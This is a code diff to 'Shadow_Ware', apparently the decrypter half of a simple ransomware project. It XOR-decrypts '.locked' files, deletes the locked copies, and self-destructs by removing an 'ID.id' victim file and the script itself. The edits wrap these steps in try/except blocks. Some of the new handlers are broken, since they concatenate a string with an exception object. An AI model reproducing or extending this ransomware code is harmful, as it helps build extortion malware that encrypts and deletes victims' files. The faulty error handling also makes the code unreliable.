@@ -53,15 +53,26 @@ class Shadow_Ware():
 
   # Decryption code
   def decrypt_file(self, input_file, output_file):
-      with open(input_file, "rb") as file:
-          encrypted_data = file.read()
+      # Reading input file
+      try:
+          with open(input_file, "rb") as file:
+              encrypted_data = file.read()
+      except Exception as e:
+          print(f"Failed to read {input_file} because {e}")
 
-      decrypted_data = bytearray(len(encrypted_data))
-      for i in range(len(encrypted_data)):
-          decrypted_data[i] = encrypted_data[i] ^ self.bytes_key[i % len(self.bytes_key)]
+      # Decrypting file data
+      try:
+        decrypted_data = bytearray(len(encrypted_data))
+        for i in range(len(encrypted_data)):
+            decrypted_data[i] = encrypted_data[i] ^ self.bytes_key[i % len(self.bytes_key)]
+      except Exception as e:
+         print(f"Failed to decrypt data of {input_file} because {e}")
 
-      with open(output_file, "wb") as file:
-          file.write(decrypted_data)
+      try:
+        with open(output_file, "wb") as file:
+            file.write(decrypted_data)
+      except Exception as e:
+        print(f"Failed to write data to {output_file} because {e}")
 
 
   # Encrypt All Files
@@ -69,7 +80,7 @@ class Shadow_Ware():
     files = self.get_all_files(self.current_dir)
     for file in files:
       if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath("decrypter.py"):
-        print("Locking file " + file)
+        print("Unlocking file " + file)
         self.decrypt_file(file, file[0:-7])
 
   # Remove not locked files
@@ -77,11 +88,17 @@ class Shadow_Ware():
     files = self.get_all_files(self.current_dir)
     for file in files:
         if file.endswith(".locked"):
-            print("Removed " + file)
+          try:
+            print("Removing " + file)
             os.remove(file)
+          except Exception as e:
+             print("Failed to remove " + file + "because " + e)
 
   def self_destruct(self):
-    os.remove(os.path.abspath("ID.id"))
+    try:
+      os.remove(os.path.abspath("ID.id"))
+    except Exception as e:
+      print("Failed to remove ID.id for " + e)
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
